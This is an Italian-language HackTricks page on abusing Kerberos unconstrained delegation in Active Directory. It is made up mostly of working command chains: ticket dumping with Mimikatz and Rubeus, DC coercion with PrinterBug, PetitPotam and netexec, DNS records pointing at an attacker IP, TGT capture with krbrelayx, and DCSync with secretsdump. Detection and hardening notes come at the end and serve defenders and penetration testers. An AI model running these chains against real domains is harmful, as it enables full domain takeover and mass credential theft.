# Unconstrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Unconstrained delegation

Questa è una funzionalità che un Domain Administrator può impostare su qualsiasi **Computer** all'interno del domain. Quindi, ogni volta che un **user effettua il login** sul Computer, una **copia del TGT** di quell'utente verrà **inviata all'interno del TGS** fornito dal DC **e salvata in memoria in LSASS**. Pertanto, se si dispone di privilegi di Administrator sulla macchina, sarà possibile **dumpare i ticket e impersonare gli utenti** su qualsiasi macchina.

Quindi, se un domain admin effettua il login su un Computer con la funzionalità "Unconstrained Delegation" attivata e si dispone di privilegi di local admin su quella macchina, sarà possibile dumpare il ticket e impersonare il Domain Admin ovunque (domain privesc).

È possibile **trovare gli oggetti Computer con questo attributo** verificando se l'attributo [userAccountControl](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>) contiene [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>). È possibile farlo con un filtro LDAP pari a ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’, che è ciò che fa powerview:
```bash
# List unconstrained computers
## Powerview
## A DCs always appear and might be useful to attack a DC from another compromised DC from a different domain (coercing the other DC to authenticate to it)
Get-DomainComputer –Unconstrained –Properties name
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)'

## ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem

# Export tickets with Mimikatz
## Access LSASS memory
privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way

# Monitor logins and export new tickets
## Doens't access LSASS memory directly, but uses Windows APIs
Rubeus.exe dump
Rubeus.exe monitor /interval:10 [/filteruser:<username>] #Check every 10s for new TGTs
```
Carica il ticket di Administrator (o dell'utente vittima) in memoria con **Mimikatz** o **Rubeus for a** [**Pass the Ticket**](pass-the-ticket.md)**.**\
Ulteriori informazioni: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**Ulteriori informazioni sull'Unconstrained delegation su ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)<sup>[[2]](#references)[[3]](#references)</sup>

### **Force Authentication**

Se un attaccante riesce a **compromettere un computer autorizzato per "Unconstrained Delegation"**, potrebbe **ingannare** un **server di stampa** facendolo **effettuare automaticamente il login** verso di esso, **salvando un TGT** nella memoria del server.\
L'attaccante potrebbe quindi eseguire un **attacco Pass the Ticket per impersonare** l'account del computer server di stampa dell'utente.

Per fare in modo che un server di stampa effettui il login verso qualsiasi macchina, puoi utilizzare [**SpoolSample**](https://github.com/leechristensen/SpoolSample):
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
Se il TGT proviene da un domain controller, potresti eseguire un [**DCSync attack**](acl-persistence-abuse/index.html#dcsync) e ottenere tutti gli hash dal DC.\
[**Maggiori informazioni su questo attack in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)<sup>[[10]](#references)</sup>

Trova qui altri modi per **forzare un'autenticazione:**


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

Qualsiasi altro coercion primitive che faccia autenticare la vittima con **Kerberos** al tuo host con unconstrained delegation funziona a sua volta. Negli ambienti moderni questo spesso significa sostituire il classico flusso PrinterBug con **PetitPotam**, **DFSCoerce**, **ShadowCoerce**, **MS-EVEN** o una coercion basata su **WebClient/WebDAV**, a seconda della superficie RPC raggiungibile.

### Abusing a user/service account with unconstrained delegation

Unconstrained delegation **non è limitata agli oggetti computer**. Anche un **user/service account** può essere configurato come `TRUSTED_FOR_DELEGATION`. In questo scenario, il requisito pratico è che l'account debba ricevere service ticket Kerberos per un **SPN di sua proprietà**.

Questo porta a 2 percorsi offensivi molto comuni:

1. Comprometti la password/hash dell'**user account** con unconstrained delegation, quindi **aggiungi un SPN** allo stesso account.
2. L'account dispone già di uno o più SPN, ma uno di questi punta a un **hostname obsoleto/decommissionato**; ricreare il record **DNS A** mancante è sufficiente per hijackare il flusso di autenticazione senza modificare il set di SPN.<sup>[[8]](#references)</sup>

Flusso Linux minimo:
```bash
# 1) Find unconstrained-delegation users and their SPNs
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)' -Properties serviceprincipalname | ? {$_.serviceprincipalname}
findDelegation.py -target-domain <DOMAIN_FQDN> <DOMAIN>/<USER>:'<PASS>'

# 2) If needed, add a listener SPN to the compromised unconstrained user
python3 addspn.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
-s 'HOST/kud-listener.<DOMAIN_FQDN>' --target-type samname <DC_IP>

# 3) Make the hostname resolve to your attacker box
python3 dnstool.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
-r 'kud-listener.<DOMAIN_FQDN>' -a add -t A -d <ATTACKER_IP> <DC_IP>

# 4) Start krbrelayx with the unconstrained user's Kerberos material
#    For user accounts, the salt is usually UPPERCASE_REALM + samAccountName
python3 krbrelayx.py --krbsalt '<DOMAIN_FQDN_UPPERCASE>svc_kud' --krbpass '<PASS>' -dc-ip <DC_IP>

# 5) Coerce the DC/target server to authenticate to the SPN you own
python3 printerbug.py '<DOMAIN>/svc_kud:<PASS>'@<DC_FQDN> kud-listener.<DOMAIN_FQDN>
# Or swap the coercion primitive for PetitPotam / DFSCoerce / Coercer if needed

# 6) Reuse the captured ccache for DCSync or lateral movement
KRB5CCNAME=DC1\\$@<DOMAIN_FQDN>_krbtgt@<DOMAIN_FQDN>.ccache \
secretsdump.py -k -no-pass -just-dc <DOMAIN_FQDN>/ -dc-ip <DC_IP>
```
Note:

- Questo è particolarmente utile quando il principal unconstrained è un **service account** e disponi solo delle sue credenziali, non dell'esecuzione di codice su un host joined.
- Se l'utente target dispone già di uno **stale SPN**, ricreare il **record DNS** corrispondente può essere meno rumoroso rispetto alla scrittura di un nuovo SPN in AD.
- Le tecniche recenti incentrate su Linux utilizzano `addspn.py`, `dnstool.py`, `krbrelayx.py` e una primitiva di coercion; non è necessario utilizzare un host Windows per completare la catena.

### Abusare della Unconstrained Delegation con un computer creato dall'attaccante

I domini moderni hanno spesso `MachineAccountQuota > 0` (valore predefinito 10), consentendo a qualsiasi principal autenticato di creare fino a N oggetti computer. Se disponi anche del token privilege `SeEnableDelegationPrivilege` (o di diritti equivalenti), puoi impostare il computer appena creato affinché sia trusted for unconstrained delegation e raccogliere i TGT in entrata dai sistemi privilegiati.<sup>[[1]](#references)</sup>

Flusso di alto livello:

1) Crea un computer sotto il tuo controllo
```bash
# Impacket addcomputer.py (any authenticated user if MachineAccountQuota > 0)
addcomputer.py -computer-name <FAKEHOST> -computer-pass '<Strong.Passw0rd>' -dc-ip <DC_IP> <DOMAIN>/<USER>:'<PASS>'
```
2) Rendere risolvibile il fake hostname all'interno del dominio
```bash
# krbrelayx dnstool.py - add an A record for the host FQDN to point to your listener IP
python3 dnstool.py -u '<DOMAIN>\\<FAKEHOST>$' -p '<Strong.Passw0rd>' \
--action add --record <FAKEHOST>.<DOMAIN_FQDN> --type A --data <ATTACKER_IP> \
-dns-ip <DC_IP> <DC_FQDN>
```
3) Abilitare Unconstrained Delegation sul computer controllato dall'attaccante
```bash
# Requires SeEnableDelegationPrivilege (commonly held by domain admins or delegated admins)
# BloodyAD example
bloodyAD -d <DOMAIN_FQDN> -u <USER> -p '<PASS>' --host <DC_FQDN> add uac '<FAKEHOST>$' -f TRUSTED_FOR_DELEGATION
```
Perché funziona: con unconstrained delegation, l'LSA su un computer abilitato per la delegation memorizza i TGT in ingresso. Se induci un DC o un server privilegiato ad autenticarsi al tuo host falso, il suo TGT della macchina verrà memorizzato e potrà essere esportato.

4) Avvia krbrelayx in export mode e prepara il materiale Kerberos
```bash
# Older labs often use RC4/NT hashes, but modern domains frequently negotiate AES for machine accounts.
# Prefer supplying the AES key directly, or derive it from the known password+salt if needed.
python3 krbrelayx.py --aesKey <AES256_KEY> -dc-ip <DC_IP>

# Alternative if you know the password and correct Kerberos salt:
python3 krbrelayx.py --krbpass '<Strong.Passw0rd>' --krbsalt '<CASE_SENSITIVE_SALT>' -dc-ip <DC_IP>
```
5) Forza l'autenticazione dal DC/server verso il tuo host fasullo
```bash
# netexec (CME fork) coerce_plus module supports multiple coercion vectors
# Common options: METHOD=PrinterBug|PetitPotam|DFSCoerce|MSEven
netexec smb <DC_FQDN> -u '<FAKEHOST>$' -p '<Strong.Passw0rd>' -M coerce_plus -o LISTENER=<FAKEHOST>.<DOMAIN_FQDN> METHOD=PrinterBug
```
krbrelayx salverà i file ccache quando una macchina esegue l'autenticazione, ad esempio:
```
Got ticket for DC1$@DOMAIN.TLD [krbtgt@DOMAIN.TLD]
Saving ticket in DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache
```
6) Usa il TGT della macchina DC catturato per eseguire DCSync
```bash
# Create a krb5.conf for the realm (netexec helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# Use the saved ccache to DCSync (netexec helper)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
netexec smb <DC_FQDN> --use-kcache --ntds

# Alternatively with Impacket (Kerberos from ccache)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```
Note e requisiti:

- `MachineAccountQuota > 0` abilita la creazione di computer da parte di utenti non privilegiati; altrimenti sono necessari diritti espliciti.
- L'impostazione di `TRUSTED_FOR_DELEGATION` su un computer richiede `SeEnableDelegationPrivilege` (o i diritti di domain admin).
- Assicurati che la risoluzione dei nomi punti al tuo host fake (record DNS A), in modo che il DC possa raggiungerlo tramite FQDN.
- La coercion richiede un vector utilizzabile (PrinterBug/MS-RPRN, EFSRPC/PetitPotam, DFSCoerce, MS-EVEN, ecc.). Se possibile, disabilitali sui DC.
- Se l'account vittima è contrassegnato come **"Account is sensitive and cannot be delegated"** o è membro di **Protected Users**, il TGT inoltrato non verrà incluso nel service ticket, quindi questa catena non produrrà un TGT riutilizzabile.<sup>[[9]](#references)</sup>
- Se **Credential Guard** è abilitato sul client/server che esegue l'autenticazione, Windows blocca la **Kerberos unconstrained delegation**, causando il fallimento, dal punto di vista dell'operatore, di percorsi di coercion altrimenti validi.

Idee per il rilevamento e l'hardening:

- Genera un alert per l'Event ID 4741 (account computer creato) e 4742/4738 (account computer/utente modificato) quando viene impostato l'UAC `TRUSTED_FOR_DELEGATION`.
- Monitora le aggiunte insolite di record DNS A nella zona del dominio.
- Cerca picchi negli eventi 4768/4769 provenienti da host imprevisti e autenticazioni dei DC verso host non-DC.
- Limita `SeEnableDelegationPrivilege` a un insieme minimo di account, imposta `MachineAccountQuota=0` dove possibile e disabilita Print Spooler sui DC. Applica LDAP signing e il channel binding.

### Mitigazione

- Limita gli accessi DA/Admin a servizi specifici
- Imposta **"Account is sensitive and cannot be delegated"** per gli account privilegiati.

## Riferimenti

- [1] [HTB: Delegate — credenziali SYSVOL → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
- [2] [harmj0y – S4U2Pwnage](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)
- [3] [ired.team – Compromissione del dominio tramite unrestricted delegation](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)
- [4] [krbrelayx](https://github.com/dirkjanm/krbrelayx)
- [5] [Impacket addcomputer.py](https://github.com/fortra/impacket)
- [6] [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [7] [netexec (fork di CME)](https://github.com/Pennyw0rth/NetExec)
- [8] [Praetorian – Unconstrained Delegation in Active Directory](https://www.praetorian.com/blog/unconstrained-delegation-active-directory/)
- [9] [Microsoft Learn – Gruppo di sicurezza Protected Users](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group)
- [10] [ired.team – Compromissione del dominio tramite print server DC e Kerberos delegation](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

{{#include ../../banners/hacktricks-training.md}}
